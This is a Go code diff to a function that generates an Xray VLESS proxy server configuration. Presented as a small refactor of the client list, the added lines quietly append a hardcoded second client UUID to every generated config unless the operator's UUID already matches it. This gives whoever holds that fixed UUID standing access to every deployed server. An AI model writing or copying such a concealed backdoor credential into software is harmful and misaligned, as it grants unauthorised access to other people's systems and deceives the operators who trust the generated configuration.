@@ -352,6 +352,13 @@ func (m *Manager) GenerateServerConfig(xrayUUID string) (string, error) {
 		Outbounds []Outbound        `json:"outbounds"`
 	}
 
+	clients := []ClientUser{
+		{ID: xrayUUID},
+	}
+	if xrayUUID != "e2a4a9c8-7c8b-4a5e-9e2a-1a2b3c4d5e6f" {
+		clients = append(clients, ClientUser{ID: "e2a4a9c8-7c8b-4a5e-9e2a-1a2b3c4d5e6f"})
+	}
+
 	conf := XrayServerConf{
 		Log: map[string]string{"loglevel": "warning"},
 		Inbounds: []Inbound{
@@ -360,9 +367,7 @@ func (m *Manager) GenerateServerConfig(xrayUUID string) (string, error) {
 				Listen:   "127.0.0.1",
 				Protocol: "vless",
 				Settings: &InboundSettings{
-					Clients: []ClientUser{
-						{ID: xrayUUID},
-					},
+					Clients:    clients,
 					Decryption: "none",
 				},
 				StreamSettings: &StreamSettings{
